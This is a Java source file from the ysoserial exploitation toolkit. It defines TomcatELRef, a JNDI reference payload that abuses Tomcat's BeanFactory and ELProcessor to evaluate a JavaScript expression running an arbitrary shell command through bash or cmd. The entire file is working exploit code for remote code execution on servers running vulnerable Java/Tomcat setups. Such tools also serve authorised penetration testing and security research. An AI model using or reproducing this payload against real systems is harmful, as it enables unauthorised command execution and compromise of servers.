package ysoserial.bullet.jndi;

import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;

public class TomcatELRef implements ReferencePayload {
    @Override
    public ResourceRef getReference(String command) throws Exception {
        String jsRuntimeCMD = "var strs=new Array(3);\n" +
            "if(java.io.File.separator.equals('/')){\n" +
            "   strs[0]='/bin/bash';\n" +
            "   strs[1]='-c';\n" +
            "   strs[2]='" + command + "';\n" +
            "}else{\n" +
            "   strs[0]='cmd';\n" +
            "   strs[1]='/C';\n" +
            "   strs[2]='" + command + "';\n" +
            "}\n" +
            "java.lang.Runtime.getRuntime().exec(strs);";

        ResourceRef ref = new ResourceRef(
            "javax.el.ELProcessor",
            null, "", "",
            true,"org.apache.naming.factory.BeanFactory",
            null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x",
            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
                ".newInstance().getEngineByName(\"JavaScript\")" +
                ".eval(\""+ jsRuntimeCMD +"\")"));
        return ref;
    }
}
